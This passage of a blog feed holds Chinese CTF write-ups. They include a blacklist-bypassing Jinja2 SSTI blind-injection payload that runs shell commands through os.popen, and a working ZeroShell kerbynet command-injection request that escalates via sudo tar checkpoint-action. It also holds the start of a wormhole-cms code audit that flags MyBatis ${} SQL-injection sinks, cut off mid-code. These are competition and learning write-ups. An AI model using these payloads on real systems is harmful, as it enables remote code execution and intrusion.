href="https://hadagaga.github.io/p/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E9%98%B2%E6%8A%A4%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/">第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP</a></p><p><a href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html">https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/144333686">【Web】2024“国城杯”网络安全挑战大赛题解-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP</title>
      <link href="/2024/12/16/2024-%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/12/16/2024-%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB-安全"><a href="#WEB-安全" class="headerlink" title="WEB 安全"></a><strong>WEB</strong> 安全</h2><h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>​获取题目后访问到如下页面： </p><p><img src="/img/2024-changchengbei/clip_image002.jpg" alt="img"> </p><p>​审计代码可知，其中的函数： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br></pre></td></tr></table></figure><p>​判断存在模板注入漏洞，且没有回显，所以判断为盲注，那么构造 payload： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>+allchar=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>%&#125;&#123;%<span class="built_in">set</span>+a=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+b=<span class="string">&#x27;p o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+res=url_for[<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][a][b](<span class="string">&#x27;cat+/flag&#x27;</span>).read()%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>+res[<span class="number">2</span>]==allchar[<span class="number">0</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">1</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">else</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(sleep(<span class="number">1</span>))%&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>​使用该 payload 可以爆破出 flag。爆破后得到如下数据，其中长度 80 的包为包含 flag 字符的数据包： </p><p><img src="/img/2024-changchengbei/clip_image004.jpg" alt="img"> </p><p>​使用如下脚本处理数据： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_and_process_data</span>(<span class="params">file_path</span>):</span><br><span class="line">    extracted_data = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">3</span>:</span><br><span class="line">                second_col = parts[<span class="number">1</span>]</span><br><span class="line">                third_col = <span class="built_in">int</span>(parts[<span class="number">2</span>])</span><br><span class="line">                extracted_data.append((second_col, third_col))</span><br><span class="line">    sorted_data = <span class="built_in">sorted</span>(extracted_data, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment">#print(sorted_data)</span></span><br><span class="line">    <span class="keyword">return</span> sorted_data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">ascii_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(<span class="string">&#x27;&#x27;</span>.join(ascii_data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_file = <span class="string">&#x27;data.txt&#x27;</span></span><br><span class="line">    <span class="comment">#output_file = &#x27;res.txt&#x27;</span></span><br><span class="line">    sorted_data = read_and_process_data(input_file)</span><br><span class="line">    <span class="built_in">print</span>(sorted_data)</span><br><span class="line">    <span class="keyword">for</span> _i,k <span class="keyword">in</span> sorted_data:</span><br><span class="line">        <span class="built_in">print</span>(x[k],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>​得到 flag： </p><p><img src="/img/2024-changchengbei/clip_image005.jpg" alt="img"> </p><h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>​打开解压后的流量包后使用如下脚本查找流量包中的 flag： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># 打印可打印字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_re</span>(<span class="params">str1</span>):</span><br><span class="line">    str2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1.decode(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print(ord(i))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">126</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">33</span>:</span><br><span class="line">                str2 += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            str2 += <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(str2)</span></span><br><span class="line">    <span class="keyword">return</span> str2</span><br><span class="line"><span class="comment"># 写入文本函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">txt_wt</span>(<span class="params">name, txt1</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;filename:&#x27;</span> + name)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag:&#x27;</span> + txt1)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 第一次运行，清空output文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_txt</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;clear output.txt！！！&quot;</span>)</span><br><span class="line"><span class="comment"># 递归遍历的所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_bianli</span>():</span><br><span class="line">    <span class="comment"># 路径设置为当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    <span class="comment"># 返回文件下的所有文件列表</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> dd <span class="keyword">in</span> k:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;.py&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd <span class="keyword">and</span> <span class="string">&quot;output.txt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd:</span><br><span class="line">                file_list.append(os.path.join(i, dd))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"><span class="comment"># 查找文件中可能为flag的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">file_list, flag</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(i, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    j1 = str_re(j)  <span class="comment"># 可打印字符串</span></span><br><span class="line">                    <span class="comment"># print j1</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> flag:</span><br><span class="line">                        <span class="keyword">if</span> k <span class="keyword">in</span> j1:</span><br><span class="line">                            txt_wt(i, j1)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;filename:&#x27;</span>, i)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span>, j1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line"><span class="comment">#这里可以自行添加一些flag编码后的形式</span></span><br><span class="line">flag_txt = [<span class="string">&#x27;flag&#123;&#x27;</span>, <span class="string">&#x27;666c6167&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;Zmxh&#x27;</span>, <span class="string">&#x27;&amp;#102&#x27;</span>, <span class="string">&#x27;666C6167&#x27;</span>]</span><br><span class="line"><span class="comment"># 清空输出的文本文件</span></span><br><span class="line">clear_txt()</span><br><span class="line"><span class="comment"># 遍历文件名</span></span><br><span class="line">file_lt = file_bianli()</span><br><span class="line"><span class="comment"># 查找flag关键字</span></span><br><span class="line">flag(file_lt, flag_txt)</span><br></pre></td></tr></table></figure><p><img src="/img/2024-changchengbei/clip_image009.jpg" alt="img"> </p><p>​将输入进行 base64 解码后得到 flag： </p><p>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A} </p><h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>​启动虚拟机后访问 <a href="http://61.139.2.100/">http://61.139.2.100</a> <a href="http://61.139.2.100/">进</a>入如下页面： </p><p><img src="/img/2024-changchengbei/clip_image011.jpg" alt="img"> </p><p>​根据流量包中的信息可知漏洞位于：&#x2F;cgi-bin&#x2F;kerbynet 中。 访问后抓包： </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61.139.2.100 </span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0 </span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1 </span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate </span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;12e9a-363-56d7136d1bb80&quot; </span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 30 May 2018 19:18:22 GMT </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br></pre></td></tr></table></figure><p>​构造路由： </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpointaction=exec=&#x27;ps%20-ef&#x27;%0A&#x27;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61.139.2.100 </span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0 </span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1 </span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate </span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;12e9a-363-56d7136d1bb80&quot; </span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 30 May 2018 19:18:22 GMT Connection: close</span><br></pre></td></tr></table></figure><p>​发送数据包，可见命令成功执行：</p><p><img src="/img/2024-changchengbei/clip_image013.jpg" alt="img"> </p><p>​根据要求查找 flag 文件，输入命令： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag </span><br></pre></td></tr></table></figure><p><img src="/img/2024-changchengbei/clip_image015.jpg" alt="img"> </p><p>​找到 flag 文件，查看 flag 文件，得到 flag: </p><p>c6045425-6e6e-41d0-be09-95682a4f65c4 </p><p>​包裹上 flag{}: </p><p>flag{c6045425-6e6e-41d0-be09-95682a4f65c4} </p>]]></content>
      
      
      <categories>
          
          <category> CTF比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wormhole-cms</title>
      <link href="/2024/12/16/wormhole-cms/"/>
      <url>/2024/12/16/wormhole-cms/</url>
      
        <content type="html"><![CDATA[<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">├─java</span><br><span class="line">│  └─net</span><br><span class="line">│      └─stackoverflow</span><br><span class="line">│          └─cms</span><br><span class="line">│              ├─common             (公共代码)</span><br><span class="line">│              ├─config             (配置)</span><br><span class="line">│              ├─constant           (常量类)</span><br><span class="line">│              ├─dao                (数据库访问层)</span><br><span class="line">│              ├─exception          (自定义异常类)</span><br><span class="line">│              ├─model              </span><br><span class="line">│              │  ├─entity          (实体类)</span><br><span class="line">│              │  └─vo              (View Object)</span><br><span class="line">│              ├─security           (Spring Security相关代码)</span><br><span class="line">│              ├─service            (服务层代码）</span><br><span class="line">│              ├─util               (工具类)</span><br><span class="line">│              └─web                </span><br><span class="line">│                  ├─controller     (业务层代码)</span><br><span class="line">│                  │  ├─auth        (认证授权模块)</span><br><span class="line">│                  │  ├─config      (系统设置模块)</span><br><span class="line">│                  │  ├─dashboard   (仪表盘页面)</span><br><span class="line">│                  │  └─personal    (个人详情页面)</span><br><span class="line">│                  ├─filter         (过滤器)</span><br><span class="line">│                  ├─interceptor    (拦截器)</span><br><span class="line">│                  └─listener       (监听器)</span><br><span class="line">└─resources                         </span><br><span class="line">    ├─keystore                      (https key)</span><br><span class="line">    ├─lib                           (sigar动态库)</span><br><span class="line">    ├─mapper                        (Mybatis mapper文件)</span><br><span class="line">    ├─sql                           (建库脚本)</span><br><span class="line">    ├─static                        (静态文件,前端打包后放这)</span><br><span class="line">    ├─templates                     (模板文件)</span><br><span class="line">    ├─application.properties        (配置文件)</span><br><span class="line">    └─logback.xml                   (logback日志配置)</span><br></pre></td></tr></table></figure><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​经过对项目依赖的审计发现，该项目引入依赖较少，且没有已披露的漏洞。</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>​因为该项目使用了mybatis，所以我们可以直接来到resource下的mapper目录审计里面的xml文件。</p><h4 id="src-main-resources-mapper-MenuMapper-xml"><a href="#src-main-resources-mapper-MenuMapper-xml" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;MenuMapper.xml"></a>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;MenuMapper.xml</h4><p>​该文件中有两处使用了$，分别是：</p><p>第13行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;where&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;eqWrapper != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;eqWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;column&quot;</span> <span class="attr">item</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;column != null and value != null&quot;</span>&gt;</span></span><br><span class="line">                    and `$&#123;column&#125;` = #&#123;value&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;neqWrapper != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;neqWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;column&quot;</span> <span class="attr">item</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;column != null and value != null&quot;</span>&gt;</span></span><br><span class="line">                    and `$&#123;column&#125;` != #&#123;value&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;inWrapper != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;inWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;column&quot;</span> <span class="attr">item</span>=<span class="string">&quot;values&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;values != null and values.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">                    and `$&#123;column&#125;` in</span><br><span class="line">                    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;values&quot;</span> <span class="attr">item</span>=<span class="string">&quot;value&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">                        #&#123;value&#125;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;ninWrapper != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;ninWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;column&quot;</span> <span class="attr">item</span>=<span class="string">&quot;values&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;values != null and values.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">                    and `$&#123;column&#125;` not in</span><br><span class="line">                    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;values&quot;</span> <span class="attr">item</span>=<span class="string">&quot;value&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">                        #&#123;value&#125;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span 